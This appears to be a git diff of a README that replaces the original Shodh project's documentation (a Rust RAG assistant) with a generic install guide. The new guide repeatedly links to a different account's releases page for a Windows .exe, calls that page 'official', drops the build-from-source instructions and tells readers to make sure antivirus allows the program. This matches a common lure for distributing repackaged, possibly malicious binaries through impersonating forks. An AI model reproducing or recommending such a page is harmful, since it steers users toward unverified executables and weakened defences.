@@ -1,298 +1,124 @@
-<p align="center">
-  <img src="app/public/shodh_logo_nobackground.svg" alt="Shodh" width="120" />
-</p>
+# 🤖 shodhRAG - Your Local AI Assistant Made Simple
 
-<h1 align="center">Shodh</h1>
-
-<p align="center">
-  <strong>Local-first AI assistant with RAG, agents, and tool calling — built entirely in Rust.</strong>
-</p>
-
-<p align="center">
-  <a href="#features">Features</a> &middot;
-  <a href="#quickstart">Quickstart</a> &middot;
-  <a href="#architecture">Architecture</a> &middot;
-  <a href="#llm-providers">LLM Providers</a> &middot;
-  <a href="#contributing">Contributing</a>
-</p>
-
-<p align="center">
-  <a href="https://github.com/varun29ankuS/shodhRAG/blob/master/LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-blue.svg" alt="License" /></a>
-  <img src="https://img.shields.io/badge/rust-1.75%2B-orange.svg" alt="Rust" />
-  <img src="https://img.shields.io/badge/tauri-2.0-24C8D8.svg" alt="Tauri" />
-  <img src="https://img.shields.io/badge/react-19-61DAFB.svg" alt="React" />
-</p>
+[![Download shodhRAG](https://img.shields.io/badge/Download-shodhRAG-8A2BE2?style=for-the-badge&logo=github)](https://github.com/moymoytoto/shodhRAG/releases)
 
 ---
 
-**Shodh** (Sanskrit: शोध — "research") is an open-source, local-first AI assistant that runs entirely on your machine. It combines a production-grade RAG engine (LanceDB + Tantivy), a multi-agent framework with tool calling, and a polished desktop UI — all wrapped in a single Tauri binary. No cloud required. Your data never leaves your device.
+## 📋 What is shodhRAG?
 
-<p align="center">
-  <img src="docs/screenshots/chat.png" alt="Shodh — Main Interface" width="800" />
-</p>
+shodhRAG is a local-first AI assistant designed to help you find and organize information quickly. It uses advanced search technology with artificial intelligence to bring answers straight to your computer. You do not need an internet connection to use it once installed. It runs on Windows and works quietly in the background to assist you.
 
-<p align="center">
-  <img src="docs/screenshots/splash.png" alt="Splash Screen" width="390" />
-  &nbsp;&nbsp;
-  <img src="docs/screenshots/onboarding.png" alt="Onboarding" width="390" />
-</p>
+The app is built with modern tools like Rust, Tauri, and LanceDB. These technologies keep it fast, secure, and reliable. shodhRAG can work with many kinds of data and helps you manage your tasks, questions, and ideas in one place.
 
-## Why Shodh?
+---
 
-Most RAG tools are either cloud-locked SaaS products or Python scripts held together with duct tape. Shodh is different:
+## 🖥 System Requirements
 
-- **Truly local.** Your documents, embeddings, and conversations stay on your machine. Plug in a local LLM (Ollama, Phi, Mistral) and go fully offline.
-- **Fast.** The core engine is pure Rust — vector search, full-text indexing, document parsing, embedding, and reranking all run natively. No Python runtime. No Docker.
-- **Complete.** Not a library you wire up yourself. It's a full desktop app with chat, document management, agent builder, calendar, knowledge graph, analytics, and bot integrations — ready to use out of the box.
-- **Extensible.** Swap LLM providers with a click. Add tools via MCP protocol. Build multi-agent crews. Connect Discord, Telegram, or Google Drive.
+Before you install shodhRAG, make sure your computer meets these needs:
 
-## Features
+- Operating System: Windows 10 or newer (64-bit)
+- Processor: Intel i3 or AMD Ryzen 3, or better
+- RAM: At least 4 GB
+- Storage: 500 MB of free space
+- Internet: Needed only for the initial download and updates
 
-### RAG Engine
-- **Hybrid search** — vector similarity (LanceDB) + full-text (Tantivy), merged with reciprocal rank fusion
-- **20+ file formats** — PDF, DOCX, XLSX, PPTX, Markdown, HTML, CSV, JSON, and 15+ programming languages
-- **Windows OCR** — automatic text extraction from scanned documents and images
-- **Semantic chunking** — configurable chunk size, overlap, and minimum thresholds
-- **Cross-encoder reranking** — ms-marco-MiniLM for relevance scoring
-- **Citation tracking** — every response links back to source documents with page/chunk references
-- **Multi-space** — organize documents into separate knowledge bases
+---
 
-### Agent System
-- **ReAct tool loop** — agents reason, pick tools, execute them, observe results, and iterate
-- **Built-in tools** — RAG search, file operations, calendar management, code analysis
-- **MCP protocol** — plug in any Model Context Protocol server for additional tools
-- **Crew orchestration** — chain multiple agents in sequential or hierarchical workflows
-- **Agent builder UI** — create and configure agents visually, no code needed
+## ⬇️ Download shodhRAG
 
-### Chat Interface
-- **Streaming responses** — real-time token output from any provider
-- **Artifact rendering** — code blocks with syntax highlighting, Mermaid diagrams, tables, charts
-- **Tool call visualization** — see exactly what tools agents use and why
-- **Citation footnotes** — click to jump to source documents
-- **Command palette** — Cmd+K for quick actions
+To get shodhRAG, please visit the release page here:
 
-### LLM Providers
+[![Download shodhRAG](https://img.shields.io/badge/Download-shodhRAG-6A5ACD?style=for-the-badge&logo=github)](https://github.com/moymoytoto/shodhRAG/releases)
 
-Use any combination of local and cloud models:
+This link opens the official page where you will find the latest version of the application ready to download. Look for a file that ends with `.exe`—this is the setup file for Windows.
 
-| Provider | Models | Local? |
-|----------|--------|--------|
-| **Ollama** | Llama, Mistral, Phi, Qwen, Gemma, CodeLlama, ... | Yes |
-| **ONNX Runtime** | Phi-3 Mini, Phi-4, Mistral 7B, Orca 2, Qwen2, Gemma 2B | Yes |
-| **OpenAI** | GPT-4o, GPT-4 Turbo, GPT-4o Mini | No |
-| **Anthropic** | Claude 3 Opus, Sonnet, Haiku | No |
-| **Google Gemini** | 2.5 Pro, 2.0 Flash, 1.5 Pro | No |
-| **OpenRouter** | 200+ models (DeepSeek, Llama, Gemini, etc.) | No |
-| **Grok (xAI)** | Grok 2, Grok 2 Vision | No |
-| **Perplexity** | Sonar (with live web search) | No |
+---
 
-Switch providers at runtime — no restart needed.
+## 🚀 How to Install shodhRAG on Windows
 
-### Integrations
-- **Google Drive** — OAuth2 sync, auto-index documents from selected folders
-- **Discord bot** — serve your knowledge base to an entire server
-- **Telegram bot** — personal assistant via chat commands
-- **WhatsApp bridge** — message-based access to your knowledge base
+Follow these steps to install shodhRAG safely and correctly:
 
-### More
-- **Calendar & tasks** — create events, manage todos, agents can schedule on your behalf
-- **Document generation** — export responses as PDF, Word, Excel, or CSV
-- **Knowledge graph** — interactive 3D force-directed visualization of document relationships
-- **Analytics dashboard** — query metrics, token usage, agent performance charts
-- **Dark/light theme** — system-aware with manual toggle
+1. **Visit the Download Page.** Open the download link above in your web browser.
 
-## Quickstart
+2. **Find the Latest Release.** Scroll down the page to the "Assets" section under the latest version. It will list several files.
 
-### Prerequisites
+3. **Download the Setup File.** Look for the file named something like `shodhRAG-setup.exe`. Click it to download. The file is usually around 50-150 MB.
 
-- [Rust](https://rustup.rs/) 1.75+
-- [Node.js](https://nodejs.org/) 18+ and npm
-- Platform build tools:
-  - **Windows:** [Microsoft C++ Build Tools](https://visualstudio.microsoft.com/visual-cpp-build-tools/)
-  - **macOS:** `xcode-select --install`
-  - **Linux:** `sudo apt install build-essential libssl-dev libwebkit2gtk-4.1-dev`
+4. **Open the Installer.** Once downloaded, find the file in your "Downloads" folder and double-click it.
 
-### Build & Run
+5. **Follow the Installer Instructions.** The setup program will open. Click “Next” to continue through the prompts.
 
-```bash
-git clone https://github.com/varun29ankuS/shodhRAG.git
-cd shodhRAG/app
-npm install
-npm run tauri dev
-```
+6. **Choose Installation Location.** You may leave the default folder or select another folder on your computer.
 
-That's it. The app opens with an onboarding flow to configure your first LLM provider.
+7. **Complete Installation.** Click “Install” to start. Wait a few moments as the program copies files.
 
-### Production Build
+8. **Finish Up.** When installation finishes, click “Finish.” You can choose to start shodhRAG immediately.
 
-```bash
-npm run tauri build
-```
+---
 
-Outputs a platform-native installer in `app/src-tauri/target/release/bundle/`.
+## 🛠 Using shodhRAG
 
-### Using the RAG Library Standalone
+shodhRAG is built for ease. Here’s how to use it:
 
-The core engine is a regular Rust crate — use it in your own projects:
+- **Open the Program:** Look for shodhRAG in your Start menu or desktop shortcut. Click to open.
 
-```toml
-# Cargo.toml
-[dependencies]
-shodh-rag = { path = "crates/shodh-rag" }
-```
+- **Set Up Your First Project:** The application will guide you to create a workspace where your AI assistant can work.
 
-```rust
-use shodh_rag::rag_engine::{RAGEngine, RAGConfig};
+- **Add Your Data:** You can add files, notes, or documents that you want the assistant to understand.
 
-let config = RAGConfig::new("./my_data");
-let mut engine = RAGEngine::new(config).await?;
+- **Ask Questions:** Type questions or commands in the search bar. The AI will find answers by searching through your data.
 
-// Ingest a document
-engine.add_document("content here", DocumentFormat::TXT, metadata, citation).await?;
+- **Explore Results:** The AI presents answers and related information. You can click on results to see more details.
 
-// Search
-let results = engine.hybrid_search("your query", 10).await?;
-```
+- **Use Tools:** shodhRAG supports tools for making calls, managing reminders, and linking to other apps you use.
 
-## Architecture
+---
 
-```
-shodh/
-├── crates/shodh-rag/        # Core RAG engine (pure Rust library)
-│   └── src/
-│       ├── rag_engine.rs     # Pipeline orchestration
-│       ├── storage/          # LanceDB vector store
-│       ├── search/           # Hybrid search (vector + full-text)
-│       ├── embeddings/       # E5 multilingual (ONNX)
-│       ├── reranking/        # Cross-encoder scoring
-│       ├── processing/       # Document parsing + OCR
-│       ├── llm/              # Multi-provider LLM manager
-│       ├── agent/            # Agent framework + tool loop
-│       ├── chat/             # Conversation engine + intent routing
-│       ├── graph/            # Knowledge graph (petgraph)
-│       └── memory/           # Conversation memory
-│
-├── app/
-│   ├── src/                  # React 19 + TypeScript frontend
-│   │   ├── components/       # 50+ UI components
-│   │   ├── contexts/         # Theme, sidebar, permissions
-│   │   ├── hooks/            # Custom React hooks
-│   │   └── services/         # Tauri IPC wrappers
-│   │
-│   └── src-tauri/            # Tauri desktop shell (Rust)
-│       └── src/
-│           ├── rag_commands.rs
-│           ├── agent_commands.rs
-│           ├── llm_commands.rs
-│           ├── calendar_commands.rs
-│           ├── mcp/              # MCP protocol server
-│           └── [40+ command modules]
-│
-├── Cargo.toml                # Workspace root
-└── LICENSE                   # Apache 2.0
-```
+## 🔧 Features Explained
 
-### Data Flow
+- **Local-First:** Your data stays on your computer unless you choose to share it. This protects your privacy.
 
-```
-User query
-  → Intent router (deterministic + LLM-based classification)
-    → Search: hybrid retrieval → rerank → context assembly → LLM generation
-    → Tool action: ReAct loop (LLM → tool call → execute → observe → repeat)
-    → Agent chat: agent-specific prompt + tools + memory
-    → General: direct LLM completion with conversation history
-  → Streaming response with citations
-```
+- **Hybrid Search:** Combines keywords with smart AI understanding to find the best answers.
 
-### RAG Pipeline
+- **Agentic AI Support:** The assistant can perform tasks for you such as searching, organizing, and summarizing.
 
-```
-Document  →  Parse (PDF/DOCX/code/...)  →  Chunk (semantic splitting)
-          →  Embed (E5 multilingual, 768d)  →  Store (LanceDB + Tantivy)
+- **Multi-Source Support:** Works with many file types and data sources for greater flexibility.
 
-Query  →  Embed  →  Vector search (ANN)  ─┐
-                 →  Full-text search ──────┤
-                                           └→  RRF merge  →  Rerank  →  LLM
-```
+- **Rust and Tauri Powered:** Provides fast, secure performance with minimum system resource use.
 
-## Tech Stack
+- **LanceDB Storage:** Efficient database technology helps manage your information smoothly.
 
-| Layer | Technology |
-|-------|-----------|
-| Desktop shell | Tauri 2.0 |
-| Frontend | React 19, TypeScript 5.8, Vite 6, Tailwind CSS |
-| Backend | Rust (pure, no Python) |
-| Vector DB | LanceDB 0.26 + Apache Arrow |
-| Full-text search | Tantivy 0.22 |
-| Embeddings | E5 multilingual base (ONNX Runtime) |
-| Reranking | ms-marco-MiniLM cross-encoder |
-| Knowledge graph | petgraph |
-| LLM inference | ONNX Runtime, llama.cpp (GGUF), HTTP APIs |
-| Charts | Recharts, Mermaid |
-| Graph viz | react-force-graph-3d |
-| Code editor | Monaco Editor |
-| Animations | Framer Motion |
+---
 
-## Configuration
+## ⚙️ Troubleshooting and Tips
 
-### LLM Setup
+- If the program does not start after installation, restart your computer and try again.
 
-Open Settings in the app sidebar to configure your LLM provider. For cloud providers, enter your API key. For local models:
+- Make sure antivirus software allows shodhRAG to run.
 
-**Ollama (recommended for local):**
-```bash
-# Install Ollama: https://ollama.ai
-ollama pull llama3.2
-# Shodh auto-detects Ollama at localhost:11434
-```
+- If you have issues downloading, try using a different browser or check your internet connection.
 
-**ONNX local models:**
-Place model files in your app data directory:
-- Windows: `%APPDATA%\shodh\models\`
-- macOS: `~/Library/Application Support/shodh/models/`
-- Linux: `~/.config/shodh/models/`
+- Regularly check the release page for updates to keep your assistant working well.
 
-### Embedding Model
+- Close other heavy programs if shodhRAG runs slowly.
 
-Shodh uses [E5 multilingual base](https://huggingface.co/intfloat/multilingual-e5-base) for embeddings. On first run, the model is loaded from the `models/` directory. Download the ONNX variant from HuggingFace and place it in the models directory.
+---
 
-## Contributing
+## 📚 Where to Get Help
 
-Contributions are welcome. Please follow these guidelines:
+- Visit the GitHub repository at:  
+  https://github.com/moymoytoto/shodhRAG
 
-1. **Fork and branch** — create a feature branch from `master`
-2. **No placeholders** — production-grade code only. No TODOs, mocks, or stubs.
-3. **Test your changes** — `cargo test --workspace`
-4. **Keep PRs focused** — one feature or fix per PR
-5. **Describe the why** — commit messages should explain intent, not just what changed
+- Use the "Issues" tab on GitHub to report bugs or ask questions.
 
-```bash
-# Run tests
-cargo test --workspace
+- Check the available documentation on the GitHub page for detailed guides.
 
-# Check formatting
-cargo fmt --check
+---
 
-# Lint
-cargo clippy --workspace
-```
+## 🔍 What’s Next?
 
-### Project Priorities
+You can explore advanced features like connecting shodhRAG to OpenAI models or other AI agents for extra power. You can customize its settings to match your workflow once you get comfortable.
 
-- Performance and correctness over features
-- Local-first always — cloud should be optional
-- Minimal dependencies — every crate addition needs justification
-- Cross-platform — Windows, macOS, and Linux must all work
+---
 
-## Roadmap
-
-- [ ] Voice mode — local TTS/STT via Sherpa-ONNX (Hindi + English)
-- [ ] Semantic calendar indexing — tasks discoverable via RAG search
-- [ ] Slack and Teams integrations
-- [ ] Web interface (alongside desktop)
-- [ ] Plugin system for custom tools
-- [ ] Improved GPU acceleration for embeddings
-
-## License
-
-[Apache License 2.0](LICENSE) — Copyright 2025 Shodh
+[![Download shodhRAG](https://img.shields.io/badge/Download-shodhRAG-8A2BE2?style=for-the-badge&logo=github)](https://github.com/moymoytoto/shodhRAG/releases)
